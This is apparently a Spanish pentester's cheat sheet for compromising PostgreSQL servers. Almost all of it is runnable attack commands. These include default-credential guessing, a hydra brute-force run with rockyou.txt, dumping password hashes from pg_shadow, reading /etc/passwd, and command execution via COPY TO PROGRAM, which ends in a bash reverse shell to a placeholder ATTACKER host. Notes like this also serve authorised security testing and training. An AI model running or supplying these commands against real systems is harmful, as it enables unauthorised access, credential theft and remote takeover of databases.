---
tags: [ports, postgresql, database]
---

# 5432/5437 — PostgreSQL

> [!important]
> Siempre probar creds por defecto: `postgres:postgres`

## Enumeración

```bash
nmap -p 5432 -sV --script-args pgsql.username=postgres target.com
```

## Fuerza Bruta

```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.209.47 postgres
```

## Conexión

```bash
psql -h 192.168.209.47 -p 5437 -U postgres -W
```

## Comandos Útiles

```sql
-- Listar bases de datos
\l

-- Conectar a una BBDD
\c nombre_bbdd

-- Listar tablas
\dt

-- Listar usuarios y contraseñas
SELECT usename, passwd FROM pg_shadow;

-- Leer archivo (si tiene permisos de superusuario)
SELECT pg_read_file('/etc/passwd');

-- RCE via COPY (superusuario)
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
```
